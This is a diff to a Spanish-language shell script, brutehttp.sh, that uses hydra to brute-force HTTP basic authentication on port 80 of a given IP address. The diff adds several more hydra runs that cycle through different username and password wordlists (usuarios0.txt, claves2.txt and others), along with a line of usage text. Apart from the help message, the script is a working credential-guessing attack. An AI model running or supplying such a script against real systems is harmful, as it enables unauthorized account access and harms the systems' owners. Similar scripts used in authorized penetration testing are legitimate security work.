@@ -34,12 +34,19 @@ MMMMMMMMMMM:MM     'M'.M'MMMMMMMMMMMMMM'.MC'M'     .MM
 INFO
 if [ -z "$1" ]; then
         echo
-        echo "Fuerza bruta con diccionarios a HTTP autenticacion basica por puerto 80/TCP."
+        echo "Fuerza bruta con diccionarios a HTTP auth basic autenticacion basica por puerto 80/TCP."
         echo "Requiere hydra"
+        echo "Especificar ruta / de la carpeta "
         echo "Uso.: sh brutehttp.sh <ip>"
         echo
         exit 0
 fi
 echo
 echo
+hydra -L usuarios0.txt -P claves0.txt -s 80 -f $1 http-get /
+hydra -L usuarios.txt -P claves0.txt -s 80 -f $1 http-get /
 hydra -L usuarios.txt -P claves.txt -s 80 -f $1 http-get /
+hydra -L usuarios0.txt -P claves.txt -s 80 -f $1 http-get /
+hydra -L usuarios.txt -P claves.txt -s 80 -f $1 http-get /
+hydra -L usuarios.txt -P claves2.txt -s 80 -f $1 http-get /
+hydra -L usuarios0.txt -P claves2.txt -s 80 -f $1 http-get /
